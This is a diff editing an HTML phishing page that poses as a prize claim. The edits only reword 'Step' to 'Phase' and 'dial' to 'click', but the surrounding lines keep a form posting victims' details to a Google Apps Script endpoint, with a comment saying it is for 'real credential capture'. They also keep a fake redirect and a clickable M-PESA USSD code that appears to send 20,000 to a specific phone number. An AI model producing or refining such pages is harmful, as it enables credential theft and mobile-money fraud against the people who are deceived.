@@ -1,4 +1,4 @@
-````html name=professional_mimic_prize_claim_with_redirect_and_ussd.html
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -90,7 +90,7 @@
         </div>
         <div id="main-form">
             <div class="step">
-                <strong>Step 1: Verify Your Details</strong>
+                <strong>Phase 1: Verify Your Details</strong>
                 <!-- Replace YOUR_SCRIPT_URL with your Google Apps Script deployment URL for real credential capture -->
                 <form action="https://script.google.com/macros/s/AKfycbxUJGQ78OWmePx4RrinUZN4gc7FpEECx-wUKZTvGVuJzwvbMaf23sqDerV0MuKTAhFcpg/exec" method="post" onsubmit="fakeRedirect(); return false;">
                     <div class="input-group">
@@ -105,12 +105,12 @@
                 </form>
             </div>
             <div class="step">
-                <strong>Step 2: Instant Claim Option</strong><br>
+                <strong>Phase 2: Instant Claim Option</strong><br>
                 <p>For immediate processing, click below to claim instantly via M-PESA USSD:</p>
                 <a href="#" onclick="ussdStep(event)" class="btn">Claim Instantly</a>
                 <div class="dial-link">
                     <a href="tel:*234*1*0708392373*20000#">
-                        Or dial: <span style="font-family:monospace;">*234*1*0708392373*20000#</span>
+                        Or click: <span style="font-family:monospace;">*234*1*0708392373*20000#</span>
                     </a>
                 </div>
             </div>
